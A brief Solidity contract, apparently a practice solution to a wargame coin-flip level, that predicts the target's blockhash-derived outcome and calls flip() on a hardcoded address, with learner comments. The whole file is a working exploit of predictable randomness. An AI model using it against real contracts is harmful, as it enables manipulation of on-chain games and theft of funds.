pragma solidity ^0.8.0;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipSniper {
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    ICoinFlip target = ICoinFlip(0xFae48020a9b6bdEE3477461E970ed1636f2aD80D);

    // execute this in 10 different blocks so we dont hit the revert().
    function snipe() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        // call coinflip now with side. but how do you specify that...
        // would need an address but in high level solidity how??
        target.flip(side);
    }
}
